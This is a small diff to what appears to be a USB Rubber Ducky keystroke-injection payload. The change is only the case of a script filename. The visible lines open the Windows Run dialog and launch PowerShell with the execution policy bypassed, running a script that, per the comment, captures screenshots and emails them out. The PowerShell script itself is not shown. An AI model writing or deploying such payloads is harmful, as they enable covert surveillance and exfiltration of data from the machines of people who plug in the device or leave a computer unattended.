@@ -15,5 +15,5 @@ DELAY 2000
 REM Execute PowerShell script to capture screenshots and send via email
 GUI r
 DELAY 500
-STRING powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\<YourUsername>\CAE.ps1
+STRING powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\<YourUsername>\CaE.ps1
 ENTER
